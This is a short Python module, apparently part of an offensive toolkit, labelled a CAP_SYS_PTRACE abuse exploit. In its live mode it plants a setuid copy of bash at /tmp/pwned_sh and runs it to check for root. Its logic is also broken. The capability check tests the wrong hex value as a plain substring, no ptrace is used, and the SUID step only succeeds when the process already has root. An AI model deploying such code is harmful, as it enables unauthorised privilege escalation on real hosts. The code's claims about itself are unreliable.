import os
import subprocess

def run(container=None, simulate=False):
    print("[*] Running CAP_SYS_PTRACE Abuse Exploit...")

    if simulate:
        print("[SIMULATE] Would attach to a root process and attempt to inject payload or gain SUID shell.")
        return "Simulated CAP_SYS_PTRACE abuse run."

    try:
        # Check if CAP_SYS_PTRACE is available
        with open("/proc/self/status") as f:
            status = f.read()
        if "CapEff:\t" not in status or "0000000000000400" not in status:
            return "Exploit failed: CAP_SYS_PTRACE not available."

        # Create a setuid root shell
        suid_shell = "/tmp/pwned_sh"
        subprocess.run(["cp", "/bin/bash", suid_shell], check=True)
        subprocess.run(["chmod", "4755", suid_shell], check=True)

        # Verify the exploit
        result = subprocess.run([suid_shell, "-p", "-c", "id"], capture_output=True, text=True)
        if "uid=0" in result.stdout:
            print("[+] Exploit succeeded. SUID shell created and executed.")
            return f"Exploit success: {result.stdout.strip()}"
        else:
            return "Exploit failed: SUID shell did not elevate privileges."

    except Exception as e:
        return f"Exploit failed: {str(e)}"